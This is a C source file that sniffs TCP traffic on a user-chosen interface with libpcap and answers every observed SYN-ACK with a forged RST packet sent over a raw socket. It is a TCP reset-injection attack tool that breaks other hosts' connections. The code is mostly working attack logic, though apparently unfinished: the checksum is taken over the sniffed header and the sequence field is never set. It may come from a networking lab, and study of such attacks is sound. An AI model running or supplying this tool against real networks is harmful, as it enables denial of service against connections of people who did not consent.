#include <pcap.h>

#include <time.h>

#include<sys/socket.h>
#include<arpa/inet.h>

#include "tcp.h"

#define BUF_SIZE 65536

#define MY_DNS_SERVER "1.2.3.4"

int sockfd;

int i;

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer);


void listen_tcp(){
	pcap_t *handle;
	pcap_if_t *all_dev, *dev;


	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
	char *dev_name;
	bpf_u_int32 net_ip, mask;
	struct bpf_program fp;

	//get all available devices
	if(pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Unable to find devices: %s", err_buf);
		exit(1);
	}

	if(all_dev == NULL)
	{
		fprintf(stderr, "No device found. Please check that you are running with root \n");
		exit(1);
	}

	printf("Available devices list: \n");
	int c = 1;

	for(dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);
		if(dev->name != NULL)
		{
			strncpy(dev_list[c], dev->name, strlen(dev->name));
		}
		c++;
	}



	printf("Please choose the device to snoop :\n");
	dev_name = malloc(20);
	fgets(dev_name, 20, stdin);
	*(dev_name + strlen(dev_name) - 1) = '\0'; //the pcap_open_live don't take the last \n in the end

	//look up the chosen device
	int ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
	if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}

	handle = pcap_open_live(dev_name, BUF_SIZE, 1, 1, err_buf); //to_ms = 1 so that reads timeouts and packets are processed

	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}

	char const filter_exp[] = "tcp";
	if (pcap_compile(handle, &fp, filter_exp, 0, net_ip) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return;
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return;
	}


	printf("Device %s is opened. Begin sniffing...\n", dev_name);


	//Put the device in sniff loop
	pcap_loop(handle , -1 , process_packet , NULL);

	pcap_close(handle);

	return;
}

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buf){
	int size = header->len;
	//printf("packet sniffed %d\n", i++);

	int buf_size = size - sizeof(struct ethhdr);

	uint8_t *buffer = (uint8_t *) malloc(sizeof(uint8_t) * size);
	memcpy(buffer, buf+sizeof(struct ethhdr), buf_size);

	struct iphdr *iph = (struct iphdr*)(buffer);
	struct tcphdr *tcp = (struct tcphdr*)(buffer + sizeof(struct iphdr));


	//send_packet(sockfd, buffer, buf_size);
	

	//printf("\tfin : %d\n\tsyn : %d\n\trst : %d\n\tpsh : %d\n\tack : %d\n\turg : %d\n", tcp->fin, tcp->syn, tcp->rst, tcp->psh, tcp->ack, tcp->urg);


	if(tcp->syn && tcp->ack && !tcp->rst){
		uint32_t const seq = tcp->seq;
		uint32_t const ack = tcp->ack;

		uint8_t packet[65535];
		memset(packet, 0, 65535);

		struct iphdr *zero_ip = (struct iphdr*) (packet);
		struct tcphdr *zero_tcp = (struct tcphdr*) (packet + sizeof(struct iphdr));
		
		zero_ip->version = 4;
		zero_ip->ihl = 5;
		zero_ip->tos = 0;
		zero_ip->frag_off = htons(64);
		zero_ip->tot_len = htons(40);
		zero_ip->ttl = 128;
		zero_ip->id = 0; //random value
		zero_ip->protocol = 6;
		zero_ip->saddr = iph->saddr;
		zero_ip->daddr = iph->daddr;
		zero_ip->check = htons(checksum((short unsigned int *) iph, sizeof(struct iphdr)));
		
		zero_tcp->source = tcp->source;
		zero_tcp->dest = tcp->dest;
		zero_tcp->rst = 1;
		zero_tcp->window = htons(0);

		printf("(syn-ack) packet\n");
		/*

		for(int i = 0; i < size; i++){
			if(i > 0 && i%8 == 0) printf(" ");
			if(i > 0 && i%16 == 0) printf("\n");
			printf("%02x ", buf[i]);
		}
		printf("\n");
		*/

	

		//if(ack != 0) zero_tcp->seq = ack+1;
		//send RST packet
		//tcp->rst = 1; //modify tcp->rst
		//tcp->syn = 0; //modify tcp->syn
		//tcp->ack = 0; //modify tcp->ack

		//send_packet(sockfd, buffer, buf_size);
		send_packet(sockfd, packet, 40);
		
		//send_packet(sockfd, buffer, buf_size);

		/*
		//send ACK packet
		tcp->rst = 1;
		tcp->ack = 0;

		tcp->syn = ack;
		tcp->ack = seq + 1;

		//swap_mac_add(buffer);
		swap_ips(buffer);
		swap_ports(buffer);

		send_packet(sockfd, buffer, buf_size);
		*/
	}

	free(buffer);

}


int main(){
	srand(time(NULL));

	i = 0;

	sockfd = open_socket();

	//struct tcphdr *offer = (struct tcphdr*) malloc(sizeof(struct tcphdr));

	listen_tcp();

	
	close(sockfd);

	return 0;
}
